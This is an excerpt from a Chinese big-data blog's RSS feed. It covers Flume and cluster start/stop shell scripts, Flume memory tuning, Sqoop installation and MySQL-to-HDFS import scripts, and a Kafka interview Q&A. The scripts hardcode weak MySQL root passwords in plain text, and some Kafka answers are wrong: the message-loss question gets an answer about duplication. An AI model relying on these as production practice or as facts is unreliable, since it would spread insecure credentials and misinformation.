2>&1 &"        done&#125;;;"stop")&#123;        for i in hadoop104        do                echo " --------停止 $i 消费flume-------"                ssh $i "ps -ef | grep kafka-flume-hdfs | grep -v grep |awk '&#123;print \$2&#125;' | xargs -n1 kill"        done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x f2.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）f2集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f2.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）f2集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f2.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-3-项目经验之Flume内存优化"><a href="#5-3-项目经验之Flume内存优化" class="headerlink" title="5.3 项目经验之Flume内存优化"></a>5.3 项目经验之Flume内存优化</h2><p>1）问题描述：如果启动消费Flume抛出如下异常</p><p>ERROR hdfs.HDFSEventSink: process failed</p><p>java.lang.OutOfMemoryError: GC overhead limit exceeded</p><p>2）解决方案步骤：</p><p>（1）在hadoop102服务器的/opt/module/flume/conf/flume-env.sh文件中增加如下配置</p><p>export JAVA_OPTS=”-Xms100m -Xmx2000m -Dcom.sun.management.jmxremote”</p><p>（2）同步配置到hadoop103、hadoop104服务器</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ xsync flume-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）Flume内存参数设置及优化</p><p>JVM heap一般设置为4G或更高</p><p>-Xmx与-Xms最好设置一致，减少内存抖动带来的性能影响，如果设置不一致容易导致频繁fullgc。</p><p>-Xms表示JVM Heap(堆内存)最小尺寸，初始分配；-Xmx 表示JVM Heap(堆内存)最大允许的尺寸，按需分配。如果不设置一致，容易在初始化时，由于内存不够，频繁触发fullgc。</p><h2 id="5-4-采集通道启动-停止脚本"><a href="#5-4-采集通道启动-停止脚本" class="headerlink" title="5.4 采集通道启动/停止脚本"></a>5.4 采集通道启动/停止脚本</h2><h3 id="5-4-1-数据通道测试"><a href="#5-4-1-数据通道测试" class="headerlink" title="5.4.1 数据通道测试"></a>5.4.1 数据通道测试</h3><p>根据需求分别生成2020-06-14和2020-06-15日期的数据</p><p>1）修改/opt/module/applog/application.yml中业务日期为2020-06-14</p><p>#业务日期</p><p>mock.date=2020-06-14</p><p>2）执行脚本，生成2020-06-14日志数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ lg.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）再次修改/opt/module/applog/application.yml中业务日期2020-06-15</p><p>#业务日期</p><p>mock.date=2020-06-15</p><p>4）执行脚本，生成2020-06-15日志数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ lg.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）在这个期间，不断观察Hadoop的HDFS路径上是否有数据</p><p>​              <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637740975327.png" alt="1637740975327">                      </p><h3 id="5-4-2-采集通道启动-停止脚本"><a href="#5-4-2-采集通道启动-停止脚本" class="headerlink" title="5.4.2 采集通道启动/停止脚本"></a>5.4.2 采集通道启动/停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本cluster.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim cluster.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashcase $1 in"start")&#123;        echo ================== 启动 集群 ==================        #启动 Zookeeper集群        zk.sh start        #启动 Hadoop集群        hdp.sh start        #启动 Kafka采集集群        kf.sh start        #启动 Flume采集集群        f1.sh start        #启动 Flume消费集群        f2.sh start        &#125;;;"stop")&#123;        echo ================== 停止 集群 ==================        #停止 Flume消费集群        f2.sh stop        #停止 Flume采集集群        f1.sh stop        #停止 Kafka采集集群        kf.sh stop        #停止 Hadoop集群        hdp.sh stop        #停止 Zookeeper集群        zk.sh stop&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x cluster.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）cluster集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ cluster.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）cluster集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ cluster.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="6-项目2-采集业务数据"><a href="#6-项目2-采集业务数据" class="headerlink" title="6 项目2 采集业务数据"></a>6 项目2 采集业务数据</h1><h2 id="6-1-电商业务流程"><a href="#6-1-电商业务流程" class="headerlink" title="6.1 电商业务流程"></a>6.1 电商业务流程</h2><p>电商的业务流程可以以一个普通用户的浏览足迹为例进行说明，用户点开电商首页开始浏览，可能会通过分类查询也可能通过全文搜索寻找自己中意的商品，这些商品无疑都是存储在后台的管理系统中的。</p><p>当用户寻找到自己中意的商品，可能会想要购买，将商品添加到购物车后发现需要登录，登录后对商品进行结算，这时候购物车的管理和商品订单信息的生成都会对业务数据库产生影响，会生成相应的订单数据和支付数据。</p><p>订单正式生成之后，还会对订单进行跟踪处理，直到订单全部完成。</p><p>电商的主要业务流程包括用户前台浏览商品时的商品详情的管理，用户商品加入购物车进行支付时用户个人中心&amp;支付服务的管理，用户支付完成后订单后台服务的管理，这些流程涉及到了十几个甚至几十个业务数据表，甚至更多。                     </p><h2 id="6-2-电商常识"><a href="#6-2-电商常识" class="headerlink" title="6.2 电商常识"></a>6.2 电商常识</h2><h3 id="6-2-1-SKU和SPU"><a href="#6-2-1-SKU和SPU" class="headerlink" title="6.2.1 SKU和SPU"></a>6.2.1 SKU和SPU</h3><p> SKU=Stock Keeping Unit（库存量基本单位）。现在已经被引申为产品统一编号的简称，每种产品均对应有唯一的SKU号。</p><p> SPU（Standard Product Unit）：是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息集合。</p><p>例如：iPhoneX手机就是SPU。一台银色、128G内存的、支持联通网络的iPhoneX，就是SKU。</p><p>SPU表示一类商品。同一SPU的商品可以共用商品图片、海报、销售属性等。</p><h3 id="6-2-2-平台属性和销售属性"><a href="#6-2-2-平台属性和销售属性" class="headerlink" title="6.2.2 平台属性和销售属性"></a>6.2.2 平台属性和销售属性</h3><p><strong>1.平台属性</strong></p><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637745317255.png" alt="1637745317255"></p><p><strong>2.销售属性</strong></p><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637745332754.png" alt="1637745332754"></p><h2 id="6-3-业务数据采集架构"><a href="#6-3-业务数据采集架构" class="headerlink" title="6.3 业务数据采集架构"></a>6.3 业务数据采集架构</h2><p>从2.2.2可以看到整体架构；对于需求2 采集业务数据的结构图如下所示：</p><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637746045465.png" alt="1637746045465"></p><p>业务数据库是直接存储到mysql数据库的，我们可以通过sqoop组件使用JDBC将数据传输到HDFS上存储。</p><p>sqoop安装教程见：</p><p>Hive安装教程见：</p><h2 id="6-4-同步策略"><a href="#6-4-同步策略" class="headerlink" title="6.4 同步策略"></a>6.4 同步策略</h2><p>数据同步策略的类型包括：全量同步、增量同步、新增及变化同步、特殊情况</p><p>Ø 全量表：存储完整的数据。</p><p>Ø 增量表：存储新增加的数据。</p><p>Ø 新增及变化表：存储新增加的数据和变化的数据。</p><p>Ø 特殊表：只需要存储一次。</p><h3 id="6-4-1-全量同步策略"><a href="#6-4-1-全量同步策略" class="headerlink" title="6.4.1 全量同步策略"></a>6.4.1 全量同步策略</h3><p>​          <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637746273106.png" alt="1637746273106">                  </p><h3 id="6-4-2-增量同步策略"><a href="#6-4-2-增量同步策略" class="headerlink" title="6.4.2 增量同步策略"></a>6.4.2 增量同步策略</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637746298966.png" alt="1637746298966"></p><h3 id="6-4-3-新增及变化策略"><a href="#6-4-3-新增及变化策略" class="headerlink" title="6.4.3 新增及变化策略"></a>6.4.3 新增及变化策略</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637746311874.png" alt="1637746311874"></p><h3 id="6-4-4-特殊策略"><a href="#6-4-4-特殊策略" class="headerlink" title="6.4.4 特殊策略"></a>6.4.4 特殊策略</h3><p>某些特殊的表，可不必遵循上述同步策略。</p><p><strong>例如</strong>没变化的客观世界的数据（比如性别，地区，民族，政治成分，鞋子尺码）可以只存一份。</p><h2 id="6-5-业务数据导入HDFS"><a href="#6-5-业务数据导入HDFS" class="headerlink" title="6.5 业务数据导入HDFS"></a>6.5 业务数据导入HDFS</h2><h3 id="6-5-1-分析表同步策略"><a href="#6-5-1-分析表同步策略" class="headerlink" title="6.5.1 分析表同步策略"></a>6.5.1 分析表同步策略</h3><p>在生产环境，个别小公司，为了简单处理，所有表全量导入。</p><p>中大型公司，由于数据量比较大，还是严格按照同步策略导入数据。</p><p>​                          <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637746489890.png" alt="1637746489890">      </p><h3 id="6-5-2-业务数据首日同步脚本"><a href="#6-5-2-业务数据首日同步脚本" class="headerlink" title="6.5.2 业务数据首日同步脚本"></a>6.5.2 业务数据首日同步脚本</h3><p><strong>1）脚本编写</strong></p><p>（1）在/home/atguigu/bin目录下创建</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim mysql_to_hdfs_init.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容：</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashAPP=gmallsqoop=/opt/module/sqoop/bin/sqoop# 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天if [ -n "$2" ] ;then   do_date=$2else    echo "请传入日期参数"   exitfi import_data()&#123;$sqoop import \--connect jdbc:mysql://hadoop102:3306/$APP \--username root \--password 123456 \--target-dir /origin_data/$APP/db/$1/$do_date \--delete-target-dir \--query "$2 where \$CONDITIONS" \--num-mappers 1 \--fields-terminated-by '\t' \--compress \--compression-codec lzop \--null-string '\\N' \--null-non-string '\\N'hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-lzo-0.4.20.jar com.hadoop.compression.lzo.DistributedLzoIndexer /origin_data/$APP/db/$1/$do_date&#125;import_order_info()&#123;  import_data order_info "select                            id,                             total_amount,                             order_status,                             user_id,                             payment_way,                            delivery_address,                            out_trade_no,                             create_time,                             operate_time,                            expire_time,                            tracking_no,                            province_id,                            activity_reduce_amount,                            coupon_reduce_amount,                                                        original_total_amount,                            feight_fee,                            feight_fee_reduce                              from order_info"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-5-3-项目经验"><a href="#6-5-3-项目经验" class="headerlink" title="6.5.3 项目经验"></a>6.5.3 项目经验</h3><p>Hive中的Null在底层是以“\N”来存储，而MySQL中的Null在底层就是Null，为了保证数据两端的一致性。在导出数据时采用–input-null-string和–input-null-non-string两个参数。导入数据时采用–null-string和–null-non-string。</p><h2 id="6-6-Hive进行业务数据访问"><a href="#6-6-Hive进行业务数据访问" class="headerlink" title="6.6 Hive进行业务数据访问"></a>6.6 Hive进行业务数据访问</h2><p>Hive安装教程详见：<a href="https://m01ly.github.io/2020/11/14/bigdata-hive1/">https://m01ly.github.io/2020/11/14/bigdata-hive1/</a></p><p>后面就是通过Hive去对数据进行初步的分析。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/%E6%95%B0%E4%BB%93%E9%87%87%E9%9B%86%E9%A1%B9%E7%9B%AE/">数仓采集项目</category>
      
      
      <comments>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>sqoop安装教程</title>
      <link>https://m01ly.github.io/2020/11/22/bigdata-sqoop/</link>
      <guid>https://m01ly.github.io/2020/11/22/bigdata-sqoop/</guid>
      <pubDate>Sun, 22 Nov 2020 07:10:21 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-下载并解压"><a href="#1-下载并解压" class="headerlink" title="1 下载并解压"></a>1 下载并解压</h3><p>1）下载地址：<a href="http://mirrors.hust.edu.cn/apache/sqoop/1.4.6/">http://mirrors.hust.edu.cn/apache/sqoop/1.4.6/</a></p><p>2）上传安装包sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz到hadoop102的/opt/software路径中</p><p>3）解压sqoop安装包到指定目录，如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxf sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）解压sqoop安装包到指定目录，如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> sqoop-1.4.6.bin__hadoop-2.0.4-alpha/ sqoop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2 修改配置文件"></a>2 修改配置文件</h3><ol><li>进入到/opt/module/sqoop/conf目录，重命名配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> sqoop-env-template.sh sqoop-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ vim sqoop-env.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>增加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HADOOP_COMMON_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> HADOOP_MAPRED_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> HIVE_HOME<span class="token operator">=</span>/opt/module/hive<span class="token function">export</span> ZOOKEEPER_HOME<span class="token operator">=</span>/opt/module/zookeeper-3.5.7<span class="token function">export</span> ZOOCFGDIR<span class="token operator">=</span>/opt/module/zookeeper-3.5.7/conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-拷贝JDBC驱动"><a href="#3-拷贝JDBC驱动" class="headerlink" title="3 拷贝JDBC驱动"></a>3 拷贝JDBC驱动</h3><p>1）将mysql-connector-java-5.1.48.jar 上传到/opt/software路径</p><p>2）进入到/opt/software/路径，拷贝jdbc驱动到sqoop的lib目录下。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">cp</span> mysql-connector-java-5.1.48.jar /opt/module/sqoop/lib/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-验证Sqoop"><a href="#4-验证Sqoop" class="headerlink" title="4 验证Sqoop"></a>4 验证Sqoop</h3><p>我们可以通过某一个command来验证sqoop配置是否正确：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 sqoop<span class="token punctuation">]</span>$ bin/sqoop <span class="token function">help</span>Available commands:  codegen            Generate code to interact with database records  create-hive-table     Import a table definition into Hive  <span class="token function">eval</span>               Evaluate a SQL statement and display the results  <span class="token function">export</span>             Export an HDFS directory to a database table  <span class="token function">help</span>               List available commands  <span class="token function">import</span>             Import a table from a database to HDFS  import-all-tables     Import tables from a database to HDFS  import-mainframe    Import datasets from a mainframe server to HDFS  job                Work with saved <span class="token function">jobs</span>  list-databases        List available databases on a server  list-tables           List available tables <span class="token keyword">in</span> a database  merge              Merge results of incremental imports  metastore           Run a standalone Sqoop metastore  version            Display version information<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-测试Sqoop是否能够成功连接数据库"><a href="#5-测试Sqoop是否能够成功连接数据库" class="headerlink" title="5 测试Sqoop是否能够成功连接数据库"></a>5 测试Sqoop是否能够成功连接数据库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 sqoop<span class="token punctuation">]</span>$ bin/sqoop list-databases --connect jdbc:mysql://hadoop102:3306/ --username root --password 000000information_schemametastoremysqloozieperformance_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/sqoop/">sqoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/22/bigdata-sqoop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（四） kafka面试集锦</title>
      <link>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/</link>
      <guid>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/</guid>
      <pubDate>Tue, 17 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Kafka中的ISR、AR又代表什么？"><a href="#1-Kafka中的ISR、AR又代表什么？" class="headerlink" title="1. Kafka中的ISR、AR又代表什么？"></a>1. Kafka中的ISR、AR又代表什么？</h2><p>  ISR：与leader保持同步的follower集合</p><p>  AR：分区的所有副本</p><h2 id="2-Kafka中的HW、LEO等分别代表什么？"><a href="#2-Kafka中的HW、LEO等分别代表什么？" class="headerlink" title="2. Kafka中的HW、LEO等分别代表什么？"></a>2. Kafka中的HW、LEO等分别代表什么？</h2><p>  LEO：没个副本的最后条消息的offset</p><p>  HW：一个分区中所有副本最小的offset</p><h2 id="3-Kafka中是怎么体现消息顺序性的？"><a href="#3-Kafka中是怎么体现消息顺序性的？" class="headerlink" title="3. Kafka中是怎么体现消息顺序性的？"></a>3. Kafka中是怎么体现消息顺序性的？</h2><p>  每个分区内，每条消息都有一个offset，故只能保证分区内有序。</p><h2 id="4-Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？"><a href="#4-Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？" class="headerlink" title="4. Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？"></a>4. Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？</h2><p>  拦截器 -&gt; 序列化器 -&gt; 分区器</p><h2 id="5-Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？"><a href="#5-Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？" class="headerlink" title="5. Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？"></a>5. Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？</h2><p>​                                <img src="/2020/11/18/bigdata-kafka4-test/1637308582846.png" alt="1637308582846"></p><h2 id="6-“消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？"><a href="#6-“消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？" class="headerlink" title="6. “消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？"></a>6. “消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？</h2><p>  正确</p><h2 id="7-消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset-1？"><a href="#7-消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset-1？" class="headerlink" title="7. 消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset+1？"></a>7. 消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset+1？</h2><p>  offset+1</p><h2 id="8-有哪些情形会造成重复消费？"><a href="#8-有哪些情形会造成重复消费？" class="headerlink" title="8. 有哪些情形会造成重复消费？"></a>8. 有哪些情形会造成重复消费？</h2><p>   <img src="/2020/11/18/bigdata-kafka4-test/1637308597607.png" alt="1637308597607"></p><h2 id="9-那些情景会造成消息漏消费？"><a href="#9-那些情景会造成消息漏消费？" class="headerlink" title="9. 那些情景会造成消息漏消费？"></a>9. 那些情景会造成消息漏消费？</h2><p>  先提交offset，后消费，有可能造成数据的重复</p><h2 id="10-当你使用kafka-topics-sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？"><a href="#10-当你使用kafka-topics-sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？" class="headerlink" title="10. 当你使用kafka-topics.sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？"></a>10. 当你使用kafka-topics.sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？</h2><p>  1）会在zookeeper中的/brokers/topics节点下创建一个新的topic节点，如：/brokers/topics/first</p><p>  2）触发Controller的监听程序</p><p>  3）kafka Controller 负责topic的创建工作，并更新metadata cache</p><h2 id="11-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"><a href="#11-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？" class="headerlink" title="11. topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"></a>11. topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？</h2><p>可以增加</p><p>bin/kafka-topics.sh –zookeeper localhost:2181/kafka –alter –topic topic-config –partitions 3</p><h2 id="12-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"><a href="#12-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？" class="headerlink" title="12. topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"></a>12. topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？</h2><p>  不可以减少，现有的分区数据难以处理。</p><h2 id="13-Kafka有内部的topic吗？如果有是什么？有什么所用？"><a href="#13-Kafka有内部的topic吗？如果有是什么？有什么所用？" class="headerlink" title="13. Kafka有内部的topic吗？如果有是什么？有什么所用？"></a>13. Kafka有内部的topic吗？如果有是什么？有什么所用？</h2><p>  __consumer_offsets,保存消费者offset</p><h2 id="14-Kafka分区分配的概念？"><a href="#14-Kafka分区分配的概念？" class="headerlink" title="14. Kafka分区分配的概念？"></a>14. Kafka分区分配的概念？</h2><p>  一个topic多个分区，一个消费者组多个消费者，故需要将分区分配个消费者(roundrobin、range)</p><h2 id="15-简述Kafka的日志目录结构？"><a href="#15-简述Kafka的日志目录结构？" class="headerlink" title="15. 简述Kafka的日志目录结构？"></a>15. 简述Kafka的日志目录结构？</h2><p>  每个分区对应一个文件夹，文件夹的命名为topic-0，topic-1，内部为.log和.index文件</p><h2 id="16-如果我指定了一个offset，Kafka-Controller怎么查找到对应的消息？"><a href="#16-如果我指定了一个offset，Kafka-Controller怎么查找到对应的消息？" class="headerlink" title="16. 如果我指定了一个offset，Kafka Controller怎么查找到对应的消息？"></a>16. 如果我指定了一个offset，Kafka Controller怎么查找到对应的消息？</h2><p>​    <img src="/2020/11/18/bigdata-kafka4-test/1637308610926.png" alt="1637308610926"></p><h2 id="17-聊一聊Kafka-Controller的作用？"><a href="#17-聊一聊Kafka-Controller的作用？" class="headerlink" title="17. 聊一聊Kafka Controller的作用？"></a>17. 聊一聊Kafka Controller的作用？</h2><p>  负责管理集群broker的上下线，所有topic的分区副本分配和leader选举等工作。</p><h2 id="18-Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？"><a href="#18-Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？" class="headerlink" title="18. Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？"></a>18. Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？</h2><p>  partition leader（ISR），controller（先到先得）</p><h2 id="19-失效副本是指什么？有那些应对措施？"><a href="#19-失效副本是指什么？有那些应对措施？" class="headerlink" title="19. 失效副本是指什么？有那些应对措施？"></a>19. 失效副本是指什么？有那些应对措施？</h2><p>  不能及时与leader同步，暂时踢出ISR，等其追上leader之后再重新加入</p><h2 id="20-Kafka的那些设计让它有如此高的性能？"><a href="#20-Kafka的那些设计让它有如此高的性能？" class="headerlink" title="20. Kafka的那些设计让它有如此高的性能？"></a>20. Kafka的那些设计让它有如此高的性能？</h2><p>  分区，顺序写磁盘，0-copy</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（三） kafka的API使用</title>
      <link>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/</link>
      <guid>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/</guid>
      <pubDate>Mon, 16 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Producer-API"><a href="#1-Producer-API" class="headerlink" title="1 Producer API"></a>1 Producer API</h2><h3 id="1-1-消息发送流程"><a href="#1-1-消息发送流程" class="headerlink" title="1.1 消息发送流程"></a>1.1 消息发送流程</h3><p>Kafka的Producer发送消息采用的是异步发送的方式。在消息发送的过程中，涉及到了两个线程——main线程和Sender线程，以及一个线程共享变量——RecordAccumulator。main线程将消息发送给RecordAccumulator，Sender线程不断从RecordAccumulator中拉取消息发送到Kafka broker。</p><p>​                     <img src="/2020/11/17/bigdata-kafka3-API/1637308075061.png" alt="1637308075061">           </p><p>相关参数：</p><p>batch.size：只有数据积累到batch.size之后，sender才会发送数据。</p><p>linger.ms：如果数据迟迟未达到batch.size，sender等待linger.time之后就会发送数据。</p><h3 id="1-2-异步发送API"><a href="#1-2-异步发送API" class="headerlink" title="1.2 异步发送API"></a>1.2 异步发送API</h3><p>1）导入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.4.1<span class="token 